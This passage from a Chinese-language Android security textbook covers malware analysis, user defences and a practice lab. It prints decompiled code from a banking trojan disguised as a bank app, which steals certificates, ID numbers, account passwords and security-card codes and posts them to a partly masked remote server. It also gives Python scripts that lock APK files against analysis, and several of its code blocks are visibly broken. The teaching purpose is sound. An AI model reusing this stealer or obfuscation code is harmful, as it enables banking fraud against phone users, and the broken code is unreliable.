android.permission.READ_PHONE_STATE
android.permission.ACCESS_NETWORK_STATE

安装apk文件后会生成与正常银行App相同的图标。点击此按钮即显示公告：“为了全面执行电子金融诈骗预防服务，需要更新联系方式并进行注册”。

 </div>

点击公告下方的确认按钮, 找出并显示手机中保存的手机网银使用的“公认认证书”。点击“公认认证书”后会弹出认证书密码输入窗口, 如图4-83所示。输入错误密码就不会跳转至下一页面。

 </div>

输入正确密码后又会显示假的认证窗口，要求输入姓名和身份证号码以证明是本人。之后会

提示用户输入账号、账号密码、口令卡编号。

卜面查看源代码。首先能看到使用TelephonyManager的getSubscriberId()和getLine1Number()获取手机的注册ID和电话号码。如果没有电话号码或号码长度小于11位（韩国电话号码是11位数），就使用getSimSerialNumber()获取序列号。

TelephonyManager localTelephonyManager =
(TelephonyManager) getSystemService("phone");
String str1 = localTelephonyManager.getSubscriberId();
String str2 = localTelephonyManager.getLine1Number();
if ((str2 == null) || (str2.length() < 11))
    str2 = localTelephonyManager.getSimSerialNumber();

下列源代码会搜索智能手机中的公认证书内容以窃取公认认证书密码。

<p>private static final String NPKI = "NPKI";</p>
public static String SDCardRoot =
    Environment.getExternalStorageDirectory().getAbsolutePath() +
    File.separator;
public static String getFolder = SDCardRoot + "NPKI" + File.separator +
    "yessign" + File.separator + "User" + File.separator;

如前所述，输入公认认证书密码后会要求输入姓名、身份证号码、银行帐号、账号密码、口令卡编号。这些内容会和使用TelephonyManager的getLine1Number()获取的电话号码和公认认证书一起发送到http://173.xxx.xxx.68/send_bank.php（安全起见，匿名为xxx.xxx）。

public static boolean uploadBandData(Context paramContext)
{
    BankInfo.fenlei = fenglei;
    SimpleDateFormat localSimpleDateFormat =
        new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    try
    {
        String str4 = localSimpleDateFormat.format(
            new Date(System.currentTimeMillis());
            str1 = str4;
            BankInfo.datetime = str1;
            localTelephonyManager =
                (TelephonyManager)paramContext.getSystemService("phone");
            String str2 = localTelephonyManager.getLine1Number();
            if ((str2 != null) && (str2 != "")) && (str2.length() > 10))
            {
                str3 = str2;
                BankInfo.phone1 = str3;
                ArrayList localArrayList = new ArrayList();
                localArrayList.add(new BasicNameValuePair("phone", str3));
                localArrayList.add(new BasicNameValuePair("bankinid",
                                    BankInfo.bankinid));
                localArrayList.add(new BasicNameValuePair("jumin",
                                    BankInfo.jumin));
                localArrayList.add(new BasicNameValuePair("jumin1",
                                    BankInfo.jumin1));
                localArrayList.add(new BasicNameValuePair("jumin2",

BankInfo.jumin2);
localArrayList.add(new BasicNameValuePair("banknum",
                          BankInfo.banknum));
localArrayList.add(new BasicNameValuePair("banknump",
                                BankInfo.banknumpw));
localArrayList.add(new BasicNameValuePair("paypw", ""));
localArrayList.add(new BasicNameValuePair("scard", BankInfo.scard));
localArrayList.add(new BasicNameValuePair("sn1", BankInfo.sn1));
localArrayList.add(new BasicNameValuePair("sn2", BankInfo.sn2));
localArrayList.add(new BasicNameValuePair("sn3", BankInfo.sn3));
localArrayList.add(new BasicNameValuePair("sn4", BankInfo.sn4));
localArrayList.add(new BasicNameValuePair("sn5", BankInfo.sn5));
...（中略）...

localArrayList.add(new BasicNameValuePair("sn34", BankInfo.sn34));
localArrayList.add(new BasicNameValuePair("sn35", BankInfo.sn35));
localArrayList.add(new BasicNameValuePair("renzheng",
                                BankInfo.renzheng));
localArrayList.add(new BasicNameValuePair("fenlei",
                                BankInfo.fenlei));
localArrayList.add(new BasicNameValuePair("datetime", str1));
Log.i("test", "-----上偶数据");
printBankInfo();
JSONObject localJSONObject = JSONParser.makeHttpRequest("http://173.xxx.xxx.68/send_bank.php", "POST", localArrayList);
Log.i("test", "-----?果:" + localJSONObject.toString());
return false;
}

通过VirusTotal搜索后可以看到, 47个杀毒引擎中的11个引擎可以探测出病毒。查看phone.apk和其他apk文件中包含的URL信息后发现, 服务器位于美国。

 </div>

#### 4.2.5 apk-locker使用案例

本节会介绍恶意代码中使用的一项技巧——可以锁定apk文件的方法。该方法的着眼点在于，apk文件和zip压缩文件的头文件是一致的。这个方法会对分析人员分析恶意代码形成阻碍，或者反过来说，软件开发公司可以用来保护自己开发的软件。实际生活中也有使用此方法发布“钓鱼”App的案例 $ ^{①} $。

在图4-67中查看压缩文件的头结构时，如果General purpose bit flag的2字节中的00位（表示加密文件的标签）设置为1，相关文件就会显示为加密文件（encrypted file）。

 </div>

(出处：http://en.wikipedia.org/wiki/Zip_%28file_format%29)

 </div>

如图4-87所示，利用010编辑器查看位置。

 </div>

为了得到准确地址值而进行计算时，修改为2056值，则00位（表示加密文件的标签）的值会变为0。如果设置为0，就不会显示为加密文件，而是显示为常规文件。

 </div>

再次使用010编辑器查看，如图4-89所示。

 </div>

如果把General purpost bit flag的2字节中的00位设置为1，那么解压apk文件内的classes.dex文件时就会提示输入密码，从而阻碍分析。

 </div>

如果不解压，那么即使使用dex文件分析工具也不可能正常分析。不怀好意的人如果不知道这个原理，也会消耗很长的分析时间。因此，这个技巧不仅可以用于非法目的，也能用作apk protection（当然，各位肯定会知道原理）。

 </div>

上述标签位适用于所有文件，所以文件数超过几百个时，很难手动修改。为了轻松执行这些操作，我会介绍我用Python编写的程序。下列代码对程序进行锁定，以提高分析apk文件的难度。

#!/usr/bin/python
# written in 2013 namdaehyeon <nam_daehyeon@naver.com>

import sys
import zipfile

def MakeLock(OriginalAPK):
    inZip = zipfile.ZipFile(OriginalAPK, 'r')
    outZip = zipfile.ZipFile("%s_lock.apk" % OriginalAPK: -4), "w")

    for x in inZip.infolist():
        buff = inZip.read(x.filename)
        x.flag_bits = 2057 #0x809

        if (buff):
            outZip.writestr(x, buff)

    inZip.close()
    outZip.close()

    if __name__ == '__main__':
        if len(sys.argv) is not 2:
            print sys.argv[0], "<APK Name>"
            sys.exit(2)
    else:
        MakeLock(sys.argv[1])

    下面是解锁（UnLock）锁定文件的代码。

    #!/usr/bin/python
    #written in 2013 namdaehyeon <nam_daehyeon@naver.com>

    import sys, time, os
    import zipfile
    import shutil

    def MakeUnLock(LockedAPK):
        FolderList = []

        inZip = zipfile.ZipFile(LockedAPK, 'r')
        outZip = zipfile.ZipFile("%s_unlock.apk" % LockedAPK: -4), "w")

for x in inZip.infolist():
    x.flag_bits = 2056 #0x808

    inZip.extract(x)

    if (x.filename):
        outZip.write(x.filename)

    if x.filename.find("/") == -1:
        os.remove(x.filename)
        elif x.filename.find("/") is not -1:
        tmpName = x.filename.split("/")[0]

        if any(y in tmpName for y in FolderList):
            pass
        else:
            if (tmpName):
                FolderList.append(tmpName)

    inZip.close()
    outZip.close()

    for x in FolderList:
        try:
            if (os.path.exists(x)):
                shutil.rmtree(x)
            except Exception, e:
                print e

    if __name__ == '__main__':
        if len(sys.argv) is not 2:
            print sys.argv[0], "<Locked APK>"
            sys.exit(2)
        else:
            MakeUnLock(sys.argv[1])

如果移动设备环境是Android 4.3及以上版本，则不能安装设置为APK Lock的程序。可能修改MasterKey漏洞时也修改了这一部分。

可参考下列URL。

http://erteam.nprotect.com/448
https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html

### 4.3 用户应对恶意代码威胁的方法

本节介绍用户使用Android设备时可用的应对方案。针对智能手机的恶意代码和安全威胁日益增加，2010年，韩国广播通信委员会发表了“智能手机10大安全守则”。Android设备可以在网上下载apk文件进行安装，所以对用户而言最重要的是，不要从“可疑网站”下载和安装App。

##### ① 不下载可疑程序

恶意代码会通过SNS、SMS、邮件等方式提供链接。这些链接大部分是短链接，所以用户很

准确认网址信息。禁止下载和安装使用此URL形式传播的可疑文件。

##### ② 不访问可疑网站

与上述内容相关，通过多种路径访问URL时，禁止连接可疑网站。

③ 删除不明来源的短信和邮件

禁止点击包含贷款信息、银行信用信息、广告等信息的短信和邮件，直接删除。

④ 利用密码设置功能定期修改密码

不使用手机时，需使用密码或PIN号码锁定手机。不能设置为其他人容易猜测的密码或格式。长期使用的密码很有可能被他人窃取，所以需要定期修改密码。

⑤ 只在必要时开启蓝牙等无线接口

无线接口可能导致用户信息泄漏，不使用时请关闭相关功能。

⑥ 持续出现异常情况则需杀毒

如果使用手机时速度变慢、运行异常网站或程序，则使用杀毒软件检查系统。

⑦下载文件后要先检查是否感染病毒

禁止从异常路径下载程序。如果从特定网站自动下载了apk文件，应先使用杀毒软件检查并安装。

##### ⑧PC机也要安装杀毒软件并进行定期检查

移动设备病毒不仅会感染相应设备，也会通过USB感染PC机。为了不受自动运行（Autorun）功能攻击，需实时监测PC并定期更新杀毒软件。

##### ⑨不随意修改智能手机平台结构

如果修改了手机的默认平台，就能访问Root权限可访问的所有线程和信息，很有可能遭到恶意使用。

##### ⑩ 持续更新OS和杀毒软件

将手机OS和杀毒软件都更新到最新版本，定期升级常用App以应对安全威胁。

下面详细讲解 “智能手机10大安全守则”。

#### 4.3.1 禁止点击和下载可疑URL

近年来，移动服务的使用率不断提高，为了应对这种趋势，不法分子会使用“钓鱼短信”这种社会工程学方法。他们会让用户点击链接，诱导用户安装恶意App，也有很多使用“钓鱼”网站窃取账号的案例。如果安装了恶意App，那么就会像之前章节中介绍的那样，所有用户信息就会泄漏给攻击者。

下面是韩国警察厅发布的“‘钓鱼短信’预防对策”。

(1) 使用各通信公司的客服中心、主页，从源头拦截小额付款并限制付款金额。

(*使用自己的智能手机联系114接线员，也能拦截小额付款。)

(2) 安装智能手机杀毒软件，并定期更新以阻止恶意程序。

(3)为了禁止可疑程序安装到手机，强化智能手机的安全设置。

(*智能手机安全设置强化方法：设置 > 安全 > 设备管理器 > 取选 “未知来源”)

(4) 在垃圾短信设置中添加 “商品券”、“优惠券”、“免费”、“浏览” 等单词，提前拦截 “钓鱼短信”。

(*拦截“钓鱼短信”：进入短信列表点击设置 > 垃圾短信设置 > 添加拦截关键词)

(5) 使用T-Store、Olleh Market、U+App Market、Naver App Store等应用程序市场的软件。

(6) 不要从可疑网站下载apk文件并安装。

在移动时代，人们会使用短链接而非传统URL共享信息。从Twitter等限制字数的SNS开始使用短链接以来，很多服务都开始支持使用短链接。

 </div>

攻击者会恶意使用此功能，在智能手机或邮件中通过短链接诱导用户点击并访问恶意服务器。智能手机的“钓鱼短信”攻击也常常使用短链接。

 </div>

#### ☐ 发现同时感染PC机和智能手机的恶意代码！

http://www.boannews.com/media/view.asp?idx=39079&kind=0

2013年12月24日，韩国BoanNews报道的案例称，能感染PC的恶意代码同时也能感染智能手机，这与之前从智能手机转移到PC的病毒正好相反。但这两种情况都是使用USB线进行连接时出现的。此恶意代码会针对软件开发人员或经常从黑市下载软件而开启“USB调试”功能的用户设备。

#### 安装 “钓鱼短信” 拦截App

韩国新兴安全创业公司 “SEWORKS” 一直在免费发布 “钓鱼短信” 保护软件，并于2013年4月获得移动App一等奖，受到了用户的广泛好评。每个创意都会告诉用户该如何保护自己的手机，是一个成功的案例。

此款软件会使用云服务器的数据库实时监控用户接收到的URL。点击URL时，与数据库的相关URL信息进行比较并提前拦截。用户界面也很简单，方便使用，很适合那些不会使用App从而成为“钓鱼”攻击对象的年龄层。

 </div>

#### 4.3.2 安装手机杀毒软件并定期更新

即使只用过1次手机网银，系统也会默认安装手机杀毒软件。虽然安装了杀毒软件也不能100%保证安全，但是对用户而言，这是防止感染恶意代码的最简单有效的方法。

 </div>

使用手机时最容易忽略的是更新那些已经安装的软件。有的软件会在连接Wi-Fi时自动更新，但很多程序还需要手动更新。如果提示手机操作系统新版本发布，请暂时不要使用手机，先更新操作系统。要定期更新杀毒软件和信息保护相关App。一般的App也会出现“个人信息泄漏”相关漏洞，所以常用软件也要定期更新。

 </div>

#### 4.3.3 关闭不使用的无线接口

我们使用智能手机的过程中会耗费很多流量，所以经常会激活Wi-Fi、蓝牙、GPS等无线功能。Wi-Fi会挑选信号最强的网络进行连接，所以会经常连接到攻击者安装的无线AP。各位可以在自己附近的小区走走，能实时看到不少Wi-Fi信息，很多无线AP显示后又消失了。

 </div>

登录到无线AP后会连接App相关服务器或网站。无法确定使用的服务都对数据进行了加密。攻击者可以偷看用户正在使用的个人信息等数据信息。

图4-98是使用Spoofing攻击及自动攻击工具进行测试的结果, 截获了在Naver上搜索的内容并在服务器上留下了日志, 借此甚至可以查看对方的博客或电子邮件。

 </div>

#### 4.3.4 禁止随意修改平台结构

我们在本书中为了进行测试而获取了Android系统的Root权限。Rooting是为了访问App资源或系统文件而获取Root权限的过程。恶意用户使用恶意代码感染对方手机时，可以获取管理员权限。此时会访问其他进程或内存，从而泄漏手机里的重要信息。

 </div>

#### 4.3.5 使用三星KNOX（基于SE Android）保障安全

韩国国内90%的手机使用Android系统，用得最多的是三星Galaxy系列（可能也有读者不喜欢此系列）。Galaxy系列的系统升级到Jelly bean 4.3后，开始支持KNOX的安装。KNOX针对的是企业用户，平时在手机界面进行私人操作，公司相关操作就会转到KNOX模式。

当然，不仅企业用户可以使用，一般用户也能用于个人操作。

KNOX使用SE for Android作为内核。这是Security Enhancements for Android的缩写，可以控制应用程序数据、进程、对象等。为了拦截App的恶意行为并保障安全，使用Selenium为基础开发而成。它支持Android 4.3以上版本，在Android 4.4版本默认设置为“强制”（enforcing） $ ^{①} $模式。在强制模式下，dmesg内核会记录潜在威胁，可以使用户免遭损失。甚至可以保护Root权限（UID:0）的运行，使其远离恶意程序。

使用SE Android可以受到如下保护。

☐ 防止App权限提升

☐ 防止App数据泄漏

☐ 防止绕过安全设置

☐ 对数据适用法律限制

☐ 保护应用程序和数据不受感染

 </div>

安装KNOX后会停留在之前的用户界面，仅生成KNOX图标，如图4-101所示。运行KNOX进入KNOX模式，用户界面的默认程序（邮件、记事本、浏览器等）依然显示，但图标上会添加钥匙标志，表示“在KNOX模式下安装的所有程序都会得到保护”。

 </div>

我身边没有了解或使用KNOX保护手机的用户，不怎么使用Android环境下的KNOX是因为“宣传不够”和“不方便”。在用户的认知中，KNOX是“企业版”软件。虽然其目的是为了保护企业信息，但也需要向一般用户介绍哪些功能会保护他们的手机。谁都不可能向公司的职员推荐自己一次都没有使用过的软件。

与安全性相比，用户更多追求的是使用上的便利。人们想随意安装自己想要的App，且无限随意共享文件。在安全强度比较高的KNOX模式下，这些操作都会受限，所以用户不愿意使用。

很少有用户会及时升级最新的固件。升级主版本固件时，设备会出现暂时的不稳定。在没有备份通讯录和短信的状态下升级时，所有信息都会被删除。大部分有类似经历的用户会拒绝升级。

三星KNOX不可能完全阻止数据泄漏，因为它也会出现意想不到的漏洞，但仍比一般用户环境安全得多。

可参考下列URL。

☐ https://kldp.org/files/selinux_140.pdf

☐ http://www.all-things-android.com/content/selinux-android-and-samsungknox

http://mirror.enha.kr/wiki/SELinux

□ https://source.android.com/devices/tech/security/se-linux.html

□ https://source.android.com/devices/tech/security/se-linux.html

☐ https://events.linuxfoundation.org/images/stories/pdf/lf_abs12_smalley.pdf

### 4.4 小结

本章详细讲解了分析恶意代码时必须用到的在线服务分析方法和手动分析方法。如果各位分析Android App时使用过在线分析方法，那么应该已经大致了解了这些服务的分析原理。恶意代码大小不同，手动分析的时间也有很大不同。恶意代码的进化速度很快，所以需要时间进一步了解Android架构。第5章将介绍渗透测试诊断时可以用到的Android App服务诊断方法。

本章将讲解诊断虚拟手机银行App漏洞的案例。通过对虚拟App进行实际操作，为想要学习Android程序诊断的入门者介绍漏洞分析流程和应对方案。说明过程将省略之前介绍过的工具详解，理解不了的读者可以重新浏览之前的内容。

### 5.1 构建虚拟漏洞诊断测试环境

为了帮助各位了解手机诊断流程，本节会构建虚拟漏洞诊断测试环境。先介绍主要的漏洞，之后再介绍诊断方法。

AndroidLab $ ^{①} $网站提供虚拟手机银行程序。通过顶端的“Lab1、Lab2、Lab3…”等菜单提供英文诊断指南。访问网站后，点击下方的“here”就可以移动到漏洞诊断工具下载网址。

 </div>

在图5-1左上方,将“AndroidLabs”设置为“base”（根据漏洞应对方案的等级选择程序，“base”是去除所有应对方案的程序,本节所有实操都会通过“base”程序进行),然后点击“Download ZIP”即可下载虚拟手机银行程序（AndroidLabs-Base）。

 </div>

本书在Windows环境下进行。

#### OO 从GitHub网站下载开源代码

如果想从GitHub下载源代码，需安装git程序，或从网站下载压缩文件。

访问https://github.com/nikicat/web-malware-collection进行测试。如图5-3所示，画面右侧有几种可以下载源代码的方法。

 </div>

第一种方法是复制git源文件路径，然后使用git clone命令。

git clone: https://github.com/nikicat/web-malware-collection.git

$ git clone https://github.com/nikicat/web-malware-collection.git
Cloning into 'web-malware-collection'...
remote: Counting objects: 350, done.
remote: Compressing objects: 100% (245/245), done.
Receiving objects: 97%
Receiving objects: 100% (350/350), 3.83 MiB | 61.00 KiB/s, done.
Resolving deltas: 100% (93/93), done.
Checking connectivity... done
Checking out files: 100% (262/262), done.

下载的文件会保存到git同名文件夹，如图5-4所示。下载完毕后，请务必读取README（或README.md）文件以了解运行方法。

 </div>

第二个方法是点击 “Download ZIP” 下载压缩文件。可以在不构建git环境而只想获取源代码时使用。

 </div>

相应程序需要与服务器进行联动，使用如图5-2所示的方法，从http://github.com/securitycompass/LabServer下载服务器（这次下载master）。

但服务器程序是使用Python语言编写的。为了运行Python程序，需从http://www.python.org/download/releases/2.7.5/下载符合自己系统版本的Python安装文件，然后进行安装。

为了运行Python代码编写的服务器程序，除了需要安装Python外，还需要安装相应的库（Library）。第一次使用Python的用户可能会感到很复杂，请仔细参考下面的说明。

需安装的Python库有blinker、cherrypy、flask、flask-sqlalchemy、simplejson，可以从下列网站下载。

□ https://pypi.python.org/pypi/blinker

☐ https://pypi.python.org/pypi/CherryPy/3.2.4

☐ https://pypi.python.org/pypi/Flask/0.10.1

□ https://pypi.python.org/pypi/Flask-SQLAlchemy/1.0

□ https://pypi.python.org/pypi/simplejson/3.3.1

从上述网站下载文件并解压。安装解压后的库前，需要一些准备过程。首先，为了使用命令行窗口进行安装，需要修改Windows系统环境变量。选择控制面板 > 系统 > 高级系统设置 > 高级 > 环境变量，向path变量添加Python的安装路径C:\Python27（路径根据版本不同而不同）。

 </div>

安装库之前的准备工作还没有结束。继续安装Setuptools。Windows环境下需要先安装easy_install程序。可以从下列地址下载easy_install软件包。

☐ 下载easy_install: https://pypi.python.org/pypi/setuptools（位于网页底端）

接着利用命令行窗口移动到各库解压后的文件夹，并输入python setup.py install命令进行安装。

 </div>

所有准备过程均已结束。在适当路径解压之前下载的服务器程序，此处需注意，路径不能含有中文字符。

错误：D:\安卓程序\LabServer-master

正确：D:\Android\LabServer-master

移动到相应目录后，执行Python app.py命令就能运行服务器。

 </div>

运行程序前需设置相关环境，第2章已经详细介绍过Eclipse和SDK的安装方法，故省略。

将之前下载的手机银行程序AndroidLabs-Base导入与SDK联动的Eclipse，并通过AVDM（Android Virtual Device Manager）设置模拟器（Android 2.3.3），然后运行相应程序，这样就完成了漏洞检测环境设置。该程序默认提供jdoe和bsmith账号，以登录如图5-9所示的程序，两个账号的密码都是password。

 </div>

### 5.2 OWASP TOP 10 移动安全威胁

对各项目进行实操前，首先了解一下OWASP。每个咨询公司或金融、公共机构的诊断项目都不同，但基本都包含了OWASP提供的项目，所以本书会以OWASP为基础进行介绍。

OWASP $ ^{①} $是 “Open Web Application Security Project” 的简称，为国际Web安全标准机构，进行信息泄漏、恶意代码、安全漏洞等领域的研究。OWASP发行的Web安全漏洞 “OWASP TOP 10” 每3年更新一次。

OWASP的分支机构遍布70多个国家和地区，进行着多种工作。OWASP中国的网址为：http://www.owasp.org.cn/。

 </div>

OWASP也发布移动服务的“OWASP Mobile TOP 10安全威胁”，包含了本书介绍的所有“ExploitMe移动Android Labs”实操项目。

图5-11是OWASP公开的“OWASP TOP 10移动漏洞诊断”项目，目前仍在开发，但已用于各咨询公司在大型诊断项目下分别制作分支项目。下表是对各大项目的简要介绍。

 </div>

(出处：OWASP（https://www.owasp.org/index.php/File:Topten.png）)

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>分 类</td><td style='text-align: center; word-wrap: break-word;'>英 文</td><td style='text-align: center; word-wrap: break-word;'>中 文</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M1</td><td style='text-align: center; word-wrap: break-word;'>Insecure Data Storage</td><td style='text-align: center; word-wrap: break-word;'>保存不安全的数据、重要信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M2</td><td style='text-align: center; word-wrap: break-word;'>Weak Server Side Controls</td><td style='text-align: center; word-wrap: break-word;'>有漏洞的服务器端的控制、价格操作等</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M3</td><td style='text-align: center; word-wrap: break-word;'>Insufficient Transport Layer Protection</td><td style='text-align: center; word-wrap: break-word;'>传输层保护不足（明文发送）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M4</td><td style='text-align: center; word-wrap: break-word;'>Client Side Injection</td><td style='text-align: center; word-wrap: break-word;'>客户端注入攻击</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M5</td><td style='text-align: center; word-wrap: break-word;'>Poor Authorization and Authentication</td><td style='text-align: center; word-wrap: break-word;'>有漏洞的权限与认证管理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M6</td><td style='text-align: center; word-wrap: break-word;'>Improper Session Handling</td><td style='text-align: center; word-wrap: break-word;'>不当的会话处理</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M7</td><td style='text-align: center; word-wrap: break-word;'>Security Decisions Via Untrusted Inputs</td><td style='text-align: center; word-wrap: break-word;'>对不信任的值的安全缺陷</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M8</td><td style='text-align: center; word-wrap: break-word;'>Side Channel Data Leakage</td><td style='text-align: center; word-wrap: break-word;'>旁信道数据泄漏</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M9</td><td style='text-align: center; word-wrap: break-word;'>Broken Cryptography</td><td style='text-align: center; word-wrap: break-word;'>有漏洞的密码使用、密钥可加密等</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>M10</td><td style='text-align: center; word-wrap: break-word;'>Sensitive Information Disclosure</td><td style='text-align: center; word-wrap: break-word;'>重要信息泄漏、系统信息泄露等</td></tr></table>

下面使用漏洞项目对虚拟App进行实操，书中会针对各项目进行附加说明。未使用虚拟App进行实操的部分只进行简单介绍，或通过其他示例实操，或直接省略。

可参考下列URL。

☐ https://www.owasp.org/index.php/OWASP_Mobile_Security_Project

http://www.slideshare.net/JackMannino/owasp-top-10-mobile-risks

### 5.3 保存不安全的数据

有些移动App服务会定期上传相关内容和设置信息，包括视频、音乐、广告内容等。有些程序会包含全部这些内容，并定期更新，也有一部分程序会通过FTP或Web服务下载内容。特别是支付使用费后，需要定期更新内容时，会从其他服务器下载。

但是，执行这些过程时也会包含FTP或Web服务的登录账号和密码。如果相关账号拥有可以访问指定内容以外的文件夹的权限，或读取权限以外的写、删除权限，就会对服务带来致命影响。删除设置文件后，使用此服务的付费用户就不能再更新内容，或在使用时发生错误。

 </div>

为了应对这些问题，需要把可访问保存设置文件的服务器账号权限设置为最小，只允许访问指定文件夹。放置备份文件或其他不使用的设置文件可能会带来之后的二次攻击，所以这些文件要保存到不能访问的其他文件夹。如果不使用FTP服务器而使用HTTP服务进行更新，也要对Web服务进行安全检查。

账号信息使用明文方式保存到XML文件时，如果攻击者得到了移动设备权限，就可以使用其他账号引起二次危害。下列示例是全球流行的云服务App中出现过的漏洞。

浏览 /data/data/com.contentsapp/shard_prefs/preferences.xml 文件时可以看到，username 和 password 变量以明文方式保存到文件。现在已被加密修补。

<?xml version='1.0' encoding='utf-8' standalone='yes'？”“
<map>
<string name="serviceHost">
<string name="username">boanproject</string>
<boolean name="ACCOUNT_CHECKED" value="true" />
<string name="password">1q2w3e</string>
<int name="servicePort" value="0" />
<boolean name="NotifyUploadStatus" value="true" /> </map>

此外还有Open API密钥威胁。很多人创业时使用Open API开发移动App。之前架设数据库环境开始收集庞大数据时，需要很多人力和成本，这给创业者带来了负担。现在，先头企业为了共享数据而公开了API，并把这些数据提供给创业公司，收取版权费，将数据商业化。这也有着不菲的收入。地图服务、图书搜索服务、翻译服务等就属于这一类。

使用免费开放的API数据时存在很多限制。如果超过特定流量，则需要通过合约才能使用更多数据。例如，大家都以为我们常用的谷歌翻译服务是免费的，但其他服务通过API使用谷歌翻译时，每1MB流量需要支付谷歌公司20美元的费用，而且每天翻译的文本文档不能超过2MB。

- Usage fees:
- Translation:
- $20 per 1 M characters of text, where the charges are adjusted in proportion to the number of characters actually provided.
- Language Detection:
- $20 per 1 M characters of text, where the charges are adjusted in proportion to the number of characters actually provided.
- Usage limits:
- Google Translate API has a default limit of 2M chars/day. This limit can be increased up to 50M chars/day in the Quotas pane in the Google APIs Console.
- If you need to translate more than 50 M chars/day, please contact us

 </div>

当然，这种重要服务会通过多重认证（Multi-Factor）方式提供。但只使用API密钥认证的服务中，密钥被其他用户夺取时，会有金钱上的损失。有些服务会绑定实际正在使用的账号和API密钥，此时也可能泄漏用户信息。

有偿服务的连接信息会通过对Java文件的反编译而泄漏，所以需要保存到服务器，尽量避免在移动设备中保存。因为即使加密也不可能保证完全安全的环境。

 </div>

#### 5.3.1 虚拟程序实操

本节使用测试环境中的App进行实操。Android程序为了把包含某些信息的文件提供给用户，大部分都会保存在/mnt/sdcard文件夹，有时也会根据需要保存在/data/data/<软件名称>文件夹。

程序会根据使用目的将文件保存在设备中，如果是包含了重要信息的文件，也会有“泄漏敏感信息”漏洞。

首先学习保存在/mnt/sdcard文件夹中的示例。/mnt/sdcard保存要提供给用户的数据，如果把文件保存在此，攻击者将很容易获取信息。

用户为了查看存取款记录而点击菜单Statement时，程序画面会整理并显示存取款信息。为了以文件形式将存取款记录提供给用户，系统会把结果文件保存到/mnt/sdcard/<程序目录>文件夹。

 </div>

可以使用adb工具查看模拟器中的文件。如果各位阅读第2章时架设了环境，那就应该安装了adb程序。我的电脑中，adb程序保存在\sdk\platform-tools文件夹。

 </div>

移动到adb的安装目录后，输入adb shell命令。因为此时是从根目录开始的，所以使用cd /mnt/sdcard/[相应程序相关目录]命令移动到相关文件夹以查看文件。下面看看程序文件夹是否泄漏了包含敏感信息的文件。

 </div>

检查/mnt/sdcard/adnroidlabs目录后可以看到，交易明细以HTML文件格式保存在该文件夹，如图5-17所示。因为相关文件不是被保护状态，其他人可以轻松获取，所以这是一种“不安全的数据保存方式”。

HTML文件都在使用----rxwr-x文件权限，所以所有程序或用户都拥有读、运行权限。如果攻击者获取了此设备，就可以轻松浏览相关信息。

 </div>

使用cat命令浏览交易明细后发现，文件中包含了用户的银行账号等多种敏感信息。这是包含重要信息的文件，除相关漏洞外，还包括“泄漏重要信息”漏洞。

#### 5.3.2 查看/data/data/目录

/data/data目录是保存Android程序所需数据的空间，是移动设备的低容量本地数据库。图5-19

   </div>

是使用adb shell浏览/data/data/[相应程序相关文件夹]的过程，查看是否包含重要文件。此次实操需移动至/data/data/com.securitycompass.androidbase.base文件夹。

 </div>

移动到相关目录后，可以看到preferences.xml文件。用cat命令可以看到文件内的账号(jdo)和密码(password)信息等，都是很重要的信息。

除了这些实操练习，通过sqlite直接保存数据库信息时，也会保存到移动设备的相关目录。对攻击者而言，这是很好的攻击对象。

#### 5.3.3 应对方案

为了安全地保存Android程序生成的敏感信息，我推荐3种方法。

第一，生成包含重要信息的文件时，如果在开发阶段使用Private Mode参数调用openFileOutput函数，那么一般用户是不能访问相关文件的。

FileOutputStream stream
openFileOutput(Long.toString(System.currentTimeMillis()) + ".html",
MODE_PRIVATE);

第二，要把程序生成的文件保存到只有Root权限才能浏览的文件夹。

第三，要对包含重要信息的文件进行加密（SHA、RSA、DES）。如图5-20所示，程序对重要数据使用了加密算法，并保存到preferences.xml。

但这三种方法不是最佳的应对方案。如果攻击者得到了设备的Root权限，那么第一种和第二种方法是无效的。如果第三种方法中，用户提供了文件，则其也不可能成为有效的应对方案。

 </div>

最好的应对方案是，不要把包含重要信息的文件保存在设备中。

### 5.4 易受攻击的服务器端控制

Android App使用XML格式的文件进行环境设置。有时会在XML文件中包含账号信息，App与服务器连接时，会读取文件中的账号信息以进行身份认证。

但是，反编译时会泄漏这些文件，很快就能知道哪个元素会被用作用户账号。如果属性值也能更改使用，将会带来非常大的安全威胁。如图5-21所示，<key>值设置为userno，可以判断出，<string>值是用户信息。

 </div>

攻击者可以依次修改<string>值以使用其他用户的付费服务，也可以获取用户权限并得到用户信息。这是不通过其他认证手段而接收客户端发送的值造成的。

##### 虚拟程序实操

Android程序会根据提交的值（包括用户输入的表单、数据传递值、HTTP头、实际数据等）决定下一个动作，伪造这些值会引发程序异常。本节会使用Brup Suite设置代理（proxy）服务器，运行虚拟银行程序后，查看并分析哪些变量值会使用明文传输且可修改，也会提出相应的应对方案。

要想查看变量可否修改，需要代理工具和开发工具。如果各位之前学习过Web漏洞分析，那么应该接触过代理工具。下面为了初学者进行简单介绍。

使用代理传输数据时，不会直接从自己的PC端发送数据，而是通过临时存储空间发送。使用代理工具将PC设置成代理服务器时，客户端通过代理服务器发送数据。在此过程中，可以在中间截获/修改传输值，所以能检测出变量是否被修改。

本节将使用Burp Suite $ ^{®} $工具分析漏洞。Burp Suite分为付费版本（Professional Edition）和免费版本（Free Edition）。免费版本也有足够多的功能，所以我们下载免费版本即可。我下载了burpsuite_free_v1.5文件，并保存到了适当的位置（还没有安装JDK吗？可以从http://www.oracle.com/technetwork/java/java/downloads/index.html下载适合自己操作系统的版本）。

运行相关文件时，虽然可以点击鼠标右键选择“打开方式”轻松运行，但有时“打开方式”中没有Java(TM)platform SE binary。此时可以在相同路径生成名为java -jar -Xmx512mburpsuite_free_v1.5.jar的.bat文件。

 </div>

运行Burp Suite后显示如图5-23所示画面。

 </div>

运行后，在Burp Suite上设置虚拟程序可以使用的代理服务器。

点击菜单中的Proxy > Options后，运行proxy Listeners Add窗口并点击Add按钮，进行如下设置。

